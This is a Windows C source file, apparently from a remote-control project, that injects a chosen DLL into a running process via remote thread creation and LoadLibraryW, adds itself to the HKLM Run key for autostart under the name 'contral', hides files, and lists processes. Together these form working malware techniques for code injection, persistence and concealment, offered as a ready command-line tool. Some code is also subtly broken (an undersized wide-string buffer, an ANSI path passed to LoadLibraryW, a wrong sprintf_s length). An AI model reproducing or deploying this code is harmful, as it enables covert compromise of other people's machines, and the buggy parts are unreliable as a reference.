/*
author: Forec
last edit date: 2016/09/14
email: forec@bupt.edu.cn
LICENSE
Copyright (c) 2015-2017, Forec <forec@bupt.edu.cn>

Permission to use, copy, modify, and/or distribute this code for any
purpose with or without fee is hereby granted, provided that the above
copyright notice and this permission notice appear in all copies.

THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
*/


#include "inject.h"

inline LPCWSTR stringToLPCWSTR(char *src){
	size_t srcsize = strlen(src) + 1;
	size_t convertedChars = 0;
	wchar_t *wcstring = (wchar_t *)malloc(sizeof(wchar_t)*(strlen(src) - 1));
	mbstowcs_s(&convertedChars, wcstring, srcsize, src, _TRUNCATE);
	return wcstring;
}

bool configureAutoRun(char path[]){
	HKEY hKey;
	DWORD dwDisposition;

	/* get register path */
	LPCTSTR autoRun = _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run");

	/* open auto-run-items key */
	LSTATUS createStatu = RegCreateKeyEx(HKEY_LOCAL_MACHINE,
							   autoRun, 
							   0,
							   NULL, 
							   REG_OPTION_NON_VOLATILE,
							   KEY_ALL_ACCESS | KEY_WOW64_64KEY, 
							   NULL,
							   &hKey, 
							   &dwDisposition
				);

	if (createStatu == ERROR_SUCCESS){
		/* add sub key */
		createStatu = RegSetValueEx(hKey, _T("contral"), 0, REG_SZ, (const unsigned char *)path, strlen(path));
		/* close register */
		RegCloseKey(hKey);
		if (createStatu == ERROR_SUCCESS){
			return true;
		}
	}
	return false;
}

DWORD getProcessHandle(LPCTSTR lpProcessName){
	DWORD dwRet = 0;
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapShot == INVALID_HANDLE_VALUE){
		/* failed */
		return dwRet;	
	}

	/* process entrance object */
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	/* scan process lists */
	Process32First(hSnapShot, &pe32);
	do{
		if (!lstrcmp(pe32.szExeFile, lpProcessName)){
			dwRet = pe32.th32ProcessID;
			break;
		}
	} while (Process32Next(hSnapShot, &pe32));
	CloseHandle(hSnapShot);
	return dwRet;
}

bool getCurrentProcesses(char *buf, const unsigned int buflen) {
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	HANDLE shot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (shot == INVALID_HANDLE_VALUE){
		return false;
	}
	if (!Process32First(shot, &pe32)){
		CloseHandle(shot);
		return false;
	}
	memset(buf, 0, buflen);
	do {
		sprintf_s(buf + strlen(buf), 
				buflen,
			    "%s\t %u\t %d\t %d\t %u\n", 
				pe32.szExeFile, 
				pe32.th32ParentProcessID, 
				pe32.cntThreads, 
				pe32.pcPriClassBase, 
				pe32.th32ProcessID
		);
	} while ( Process32Next(shot, &pe32));
	CloseHandle(shot);
	return true;
}

bool hideFile(char *path){
	if( SetFileAttributes(stringToLPCWSTR(path), FILE_ATTRIBUTE_HIDDEN) != 0)
		return true;
	return false;
}

bool inject(char *injectProcess, char *absolutPathForDll){
	/* get inject process' PID , the process is running yet */
	DWORD dwPid = getProcessHandle((LPCTSTR)injectProcess), lpID = 0;
	/* inject dll name */
	LPCSTR lpDllName = (LPCSTR)absolutPathForDll;
	SIZE_T lpSize = lstrlenA(lpDllName) + 1, lpWritten = 0;

	/* open injection process with all access */
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 
								  FALSE, 
								  dwPid);
	if (!hProcess){
		return false;
	}
	/* apply for an area in memory of injection process to store dll file */
	char *lpBuf = (char *)VirtualAllocEx(hProcess, 
											   NULL, 
											   0x1000, 
											   MEM_COMMIT, 
											   PAGE_READWRITE
								);
	if (lpBuf == NULL){
		return false;
	}
	/* write dll path into injection process */
	if ( !WriteProcessMemory(hProcess, 
							lpBuf,
							(LPVOID)lpDllName, 
							lpSize, 
							&lpWritten) || lpSize != lpWritten){
		/* free the area applied if failed */
		VirtualFreeEx(hProcess, 
					  lpBuf,
					  lpSize, 
					  MEM_DECOMMIT);
		return false;
	}
	/* get path for LoadLibraryA, since loading path for 
	   Kernel32.dll is same to every application. */
	LPTHREAD_START_ROUTINE pfn = 
		(LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(_T("Kernel32.dll")), 
											   "LoadLibraryW");
	/* 
		create remote thread, load dll 
		TODO: Fix the problem that CreateRemoteThreadEx may return an error(id 5) 
		under windows 8 and higher versions.
	*/
	HANDLE hRemoteThread = CreateRemoteThreadEx(hProcess, 
											  NULL, 
											  0, 
											  pfn, 
											  lpBuf,
											  0, 
											  NULL,
											  &lpID
							);
	if (hRemoteThread == NULL){
		/* free the area applied if failed */
		VirtualFreeEx(hProcess, 
					  lpBuf,
					  lpSize,
					  MEM_DECOMMIT);
		return false;

	}

	WaitForSingleObject(hRemoteThread, INFINITE);
	/* free the area applied  */
	VirtualFreeEx(hProcess, 
				  lpBuf, 
				  lpSize,
				  MEM_DECOMMIT);
	CloseHandle(hRemoteThread);
	/* uninstall dll injected */
	/*	
	DWORD dwHandle,dwID;
	LPVOID pFunc = GetModuleHandleW; // get dll injected handle
	HANDLE hThread = CreateRemoteThread(hProcess,
										NULL,
										0,
										(LPTHREAD_START_ROUTINE)pFunc,
										lpBuf,
										0,
										NULL,
										&dwID);
	WaitForSingleObject(hThread,INFINITE);
	GetExitCodeThread(hThread,&dwHandle);
	CloseHandle(hThread);
	pFunc = FreeLibrary;	// free dll
	hThread = CreateRemoteThread(hThread,
								 NULL,
								 0,
								 (LPTHREAD_START_ROUTINE)pFunc,
								 (LPVOID)dwHandle,
								 0,
								 NULL,
								 &dwID); 
	WaitForSingleObject(hThread,INFINITE);
	CloseHandle(hThread);
	*/
	CloseHandle(hProcess);
	return true;
}

int main(int argc, char *argv[]){
	if (argc != 3){
		printf("Usage: <processToInject> <absolutePathForDll>");
		return 0;
	}
	if (inject(argv[1], argv[2])){
		printf("succeed..");
	}else{
		printf("failed..");
	}
	return 0;
}